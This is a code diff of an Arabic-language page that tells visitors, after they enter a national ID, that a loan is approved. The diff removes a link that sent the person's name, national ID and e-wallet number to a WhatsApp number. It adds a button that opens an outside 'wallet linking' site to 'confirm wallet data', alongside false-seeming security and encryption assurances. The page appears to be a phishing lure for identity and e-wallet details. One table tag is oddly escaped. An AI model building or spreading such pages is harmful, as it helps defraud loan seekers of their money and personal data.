@@ -123,7 +123,6 @@
             to { opacity: 1; }
         }
 
-        /* Security badge */
         .security-info {
             display: inline-block;
             background: rgba(37, 211, 102, 0.15);
@@ -290,7 +289,6 @@
             font-weight: 600;
         }
 
-        /* Info boxes */
         .info-section {
             background: rgba(212, 175, 55, 0.08);
             border-left: 4px solid #D4AF37;
@@ -361,13 +359,13 @@
             font-weight: 700;
         }
 
-        .whatsapp-button {
+        .linking-button {
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 12px;
-            background: #25D366;
-            color: white;
+            background: linear-gradient(95deg, #D4AF37, #FFD966);
+            color: #000;
             text-decoration: none;
             padding: 18px 28px;
             border-radius: 60px;
@@ -376,17 +374,18 @@
             margin: 30px auto;
             transition: 0.3s;
             border: 1px solid #D4AF37;
-            box-shadow: 0 8px 20px rgba(37,211,102,0.3);
+            box-shadow: 0 8px 20px rgba(212,175,55,0.3);
             width: fit-content;
+            cursor: pointer;
         }
 
-        .whatsapp-button:hover {
+        .linking-button:hover {
             transform: translateY(-5px);
-            background: #20b85a;
-            box-shadow: 0 15px 30px rgba(37,211,102,0.5);
+            box-shadow: 0 15px 30px rgba(212,175,55,0.5);
+            background: linear-gradient(95deg, #FFD966, #D4AF37);
         }
 
-        .whatsapp-button i {
+        .linking-button i {
             font-size: 1.8rem;
         }
 
@@ -442,7 +441,6 @@
             color: #D4AF37;
         }
 
-        /* Transparency section */
         .transparency-section {
             background: rgba(212, 175, 55, 0.05);
             border: 1px solid rgba(212, 175, 55, 0.3);
@@ -494,7 +492,7 @@
             .search-title { font-size: 1.7rem; }
             .search-card { padding: 30px 20px; }
             .data-table td { padding: 12px 15px; font-size: 0.9rem; }
-            .whatsapp-button { font-size: 1rem; padding: 14px 20px; }
+            .linking-button { font-size: 1rem; padding: 14px 20px; }
             .congrats h2 { font-size: 1.7rem; }
             .transparency-section { padding: 1.5rem; }
         }
@@ -536,7 +534,6 @@
             <p>✅ طلب التمويل الخاص بك معتمد وجاهز للربط</p>
         </div>
 
-        <!-- Transparency section -->
         <div class="transparency-section">
             <h3>
                 <i class="fas fa-eye"></i> شفافية كاملة - بيانات التمويل
@@ -544,10 +541,9 @@
             <div class="info-section">
                 <strong>📋 معلومات مهمة:</strong> جميع البيانات المعروضة هنا آمنة ومشفرة بأعلى معايير الأمان الدولية (256-bit encryption). لا يتم مشاركة بياناتك مع أي جهة خارجية دون موافقتك الصريحة.
             </div>
-            <table class="data-table" id="dataTable"></table>
+            <table class="data-table" id="dataTable">\u003C/table\u003E
         </div>
 
-        <!-- Security and trust section -->
         <div class="transparency-section">
             <h3>
                 <i class="fas fa-lock"></i> الأمان والمصداقية
@@ -570,18 +566,17 @@
             </div>
         </div>
 
-        <!-- Next steps -->
         <div class="transparency-section">
             <h3>
                 <i class="fas fa-tasks"></i> الخطوات التالية
             </h3>
             <div class="transparency-item">
                 <i class="fas fa-circle-notch"></i>
-                <p><strong>1. التواصل مع فريق التحويلات:</strong> اضغط على الزر أدناه للتواصل مع فريقنا عبر واتساب</p>
+                <p><strong>1. ربط الحساب بالسيستم:</strong> اضغط على الزر أدناه لبدء عملية الربط الآمنة</p>
             </div>
             <div class="transparency-item">
                 <i class="fas fa-circle-notch"></i>
-                <p><strong>2. تأكيد البيانات:</strong> سيقوم الفريق بتأكيد جميع بيانات التمويل معك</p>
+                <p><strong>2. تأكيد البيانات:</strong> سيقوم النظام بتأكيد جميع بيانات التمويل معك</p>
             </div>
             <div class="transparency-item">
                 <i class="fas fa-circle-notch"></i>
@@ -594,13 +589,13 @@
         </div>
 
         <div style="text-align: center;">
-            <a href="#" id="whatsappLink" class="whatsapp-button" target="_blank">
-                <i class="fab fa-whatsapp"></i> تواصل الآن مع فريق التحويلات
-            </a>
+            <div id="linkingButton" class="linking-button" onclick="redirectToLinking()">
+                <i class="fas fa-link"></i> رابط ربط الحساب بالسيستم
+            </div>
         </div>
         <div class="note">
-            <i class="fas fa-info-circle"></i> سيتم تحويلك إلى واتساب برسالة جاهزة تحتوي بياناتك لتسريع الإجراءات<br>
-            <strong>ملاحظة:</strong> جميع المحادثات محفوظة وآمنة
+            <i class="fas fa-info-circle"></i> سيتم توجيهك إلى صفحة الربط الآمنة لتأكيد بيانات محفظتك واستكمال الإجراءات<br>
+            <strong>ملاحظة:</strong> جميع عمليات الربط مشفرة وآمنة بالكامل
         </div>
     </div>
 
@@ -747,13 +742,17 @@
     }
     createParticles();
 
+    // دالة التوجيه إلى رابط ربط الحساب بالسيستم
+    function redirectToLinking() {
+        window.open('https://bk0212937-netizen.github.io/Rabt-wilet-/', '_blank');
+    }
+
     // دالة البحث
     function searchRequest() {
         const nationalId = document.getElementById('nationalId').value.trim();
         const resultDiv = document.getElementById('resultSection');
         const errorDiv = document.getElementById('errorSection');
         const dataTable = document.getElementById('dataTable');
-        const whatsappLink = document.getElementById('whatsappLink');
 
         resultDiv.style.display = 'none';
         errorDiv.style.display = 'none';
@@ -773,10 +772,6 @@
                 <tr><td class="info-label">موعد السداد الشهري</td><td>${customer.payment}</td></tr>
             `;
             dataTable.innerHTML = rows;
-
-            const message = `السلام عليكم، أنا ${customer.name} (الرقم القومي: ${nationalId})، أود إتمام إجراءات ربط حسابي بالسيستم للحصول على تمويل بقيمة ${customer.loan}. بيانات محفظتي: ${customer.wallet} رقم ${customer.walletNum}. أريد إنهاء الربط الآن.`;
-            const encoded = encodeURIComponent(message);
-            whatsappLink.href = `https://wa.me/212614494251?text=${encoded}`;
 
             resultDiv.style.display = 'block';
             resultDiv.scrollIntoView({ behavior: 'smooth', block: 'start' });
